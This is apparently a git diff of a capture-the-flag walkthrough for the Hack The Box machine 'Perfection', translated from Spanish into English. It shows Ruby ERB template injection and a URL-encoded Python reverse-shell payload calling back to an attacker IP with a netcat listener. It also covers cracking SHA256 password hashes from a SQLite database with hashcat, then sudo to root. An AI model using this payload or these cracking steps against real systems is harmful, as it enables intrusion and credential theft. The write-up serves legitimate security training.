@@ -5,101 +5,122 @@ difficulty: easy
 os: linux
 releaseDate: 2024-03-02
 slug: "perfection"
-isPublished: false
+isPublished: true
 ---
-
 
 import Browser from "@/components/Browser.astro" 
 
 ## Enumeration
 
-Comenzaremos por un escaneo de puertos con nmap para ver que servicios tiene expuestos al exterior.
+To begin with, we can launch a scan to see what ports we have open to see what services the machine has exposed.
+
+[(command explanation)](https://explainshell.com/explain?cmd=nmap+-p-+-n+-Pn+--disable-arp-ping+-sS+-sV+-sC+-vvv+-T5+10.10.11.253+-oN+perfection)
 
 ```bash
-sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.253 -oN Perfection.nmap
+sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.253 -oN perfection
 
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    syn-ack ttl 63 nginx
 ```
 
-Una vez escaneada la maquina vemos que tiene un servicio web corriendo por lo que entramos a la web y navegando por ella llegamos a lo que viene a ser un formularip para calcular la nota media de un alumno.
+While the scan is being performed, we can try to navigate to the ip address of the machine to see if it has any web service exposed and thus save some time.
+
+As we can see in the image we get to a web form to calculate the average grade of a student.
 
 <Browser
-  url="10.10.11.253/"
+  url="10.10.11.253/weighted-grade"
   src="/walkthroughs/perfection/0.png"
 />
 
+Thanks to the [wappalyzer](https://www.wappalyzer.com/)  extension we can see that the language behind the web is Ruby, this is checked by searching for "WEBrick 1.7.0" in the browser by reaching this link at [rubygems](https://rubygems.org/gems/webrick/versions/1.7.0?locale=es).
+
 ## Exploitation
 
-Abrimos burpsuite, capturamos la petición y la mandamos al repeater.
+We open burpsuite, grab the request and send it to the repeater.
 
-Una vez ahi decido probar varios payloads para primero ver que caracteres esta filtrando y posteriormente intentar colar un revershell. Para realizar estas pruebas me baso en algunos payloads de [hacktricks] así como que la tecnologia que hay detras tiene pinta de ser Ruby. 
+![burpsuite repeater](/walkthroughs/perfection/1.png)
 
-tras varios intentos, consigo RCE en la maquina cuelo una revershell mediante el siguiente payload en el campo de categoria:
+Once there I decide to test several payloads to first see which characters are being filtered and then try to sneak a revershell. To perform these tests I rely on some payloads from [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby) as well as the technology behind it looks like Ruby. 
+
+After several attempts, I get RCE and start enumerating the system.
+
+|                     |                    |
+| ------------------- | ------------------ |
+| whoami              | susan              | 
+| hostname            | perfection         | 
+| bash                | /usr/bin/bash      |
+| python3             | /usr/bin/python3   |
+| nc                  | /usr/bin/nc        |
+| kernel version      | 5.15.0-97-generic  |
+| system architecture | x86_64             |
+| os                  | Ubuntu 22.04.4 LTS | 
+| codename            | jammy              | 
+
+
+it's time to get access. To do so, I use this [tool](https://www.revshells.com/) to generate a revershell.  
 
 ```
-category%0a<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.199",5000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'`+%25>
+category%0a<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.58",5000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'`+%25>
 ```
 
-> Nota: El payload ya esta con el encode para url en los caracteres clave gracias a burpsuite.
+> NOTE: 
+> The payload has been url encoded just for the key characters using burpsuite.
+
+we raise the listener with netcat and once we are listening, we launch the request with our shell
 
 ```bash
 nc -lvnp 5000
 ```
 
+![revershell](/walkthroughs/perfection/2.png)
+
+Once inside, we can improve our shell by following [hacktricks guide](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#full-tty) and finally, read our flag. 
+
 ```bash
-susan@perfection:~/ruby_app$ cat ~/user.txt
+cat ~/user.txt
+
 bfd33f2d5e72f0e6de3699e3bf0004bc
-```
-
-## Post Exploitation
-
-Siguiendo esta [guía](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) mejoramos nuestra shell para que sea completamente interactiva y podamos trabajar más comodamente.
-
-```bash
-script /dev/null -qc /bin/bash 
-```
-
-(inside the nc session) `CTRL+Z`
-
-```bash
-stty raw -echo; fg
-```
-
-(inside the nc session) 
-```bash
-reset xterm
-```
-
-(inside the nc session) 
-```bash
-export SHELL=/bin/bash; 
-export TERM=screen; 
-stty rows 38 columns 116;
-reset;
 ```
 
 ##  Privilege escalation
 
-haciendo `ls` en el home del usuario, podemos ver que hay una carpeta llamada Migration en cuyo interior hay un fichero que tras aplicar la herramienta file podemos ver que es una base de datos sqlite3
+listing the user's home, we can see that there is a folder called Migration inside of which there is a file that after applying the file tool we can see that it is a sqlite3 database
 
 ```bash
 susan@perfection:~/Migration$ ls
 pupilpath_credentials.db
+```
+
+```bash
 susan@perfection:~/Migration$ file pupilpath_credentials.db 
 pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6
 ```
 
-a continuacion procedo a hacer un poco de enumeracion dentro de esta base de datos obteniendo:
+we access the database and again begin enumerating
 
 ```bash
 susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
 SQLite version 3.37.2 2022-01-06 13:25:41
 Enter ".help" for usage hints.
+```
+
+```bash
 sqlite> .tables
 users
+```
+
+```bash
+sqlite> PRAGMA table_info(users);
+
+0|id|INTEGER|0||1
+1|name|TEXT|0||0
+2|password|TEXT|0||0
+```
+
+```bash
 sqlite> select * from users;
+
 1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
 2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
 3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
@@ -107,21 +128,27 @@ sqlite> select * from users;
 5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
 ```
 
-parecen ser los usuarios y contraseñas de los alumnos. para confirmar, decido ver el nombre de las columnas:
+Chatgpt reports that the hash format appears to be `SHA256` and if we look at the mail there is an email indicating that the new passwords will follow an specific format.
 
 ```bash
-sqlite> PRAGMA table_info(users);
-0|id|INTEGER|0||1
-1|name|TEXT|0||0
-2|password|TEXT|0||0
+susan@perfection:~/ruby_app$ cat /var/mail/susan
+
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students 
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
 ```
 
-según chatgpt, el formato del hash parece ser un SHA256 y si miramos el mail aparece un correo indicando que las nuevas contraseñas van a seguir el formato:
-
 ```
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
 ```
-
-a continuacion, procedo a ejecutar hashcat para crackear el hash de nuestro usuario `susan` y así pode escalar privilegios.
+Next, using hashcat we crack the hash of the user `susan` to escalate privileges.
 
 ```bash
 hashcat -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d" --show 
@@ -138,7 +165,17 @@ Matching Defaults entries for susan on perfection:
 
 User susan may run the following commands on perfection:
     (ALL : ALL) ALL
+```
+
+as we can see, susan has permission to execute any command as root and as we have his password, we launch a bash with sudo
+
+```bash
 susan@perfection:/var/mail$ sudo bash
+```
+
+Finally, we read our root flag
+
+```bash
 root@perfection:~# cat ~/root.txt 
 ea927a4fe65ba5eaf2323d5b7d22a061
 ```
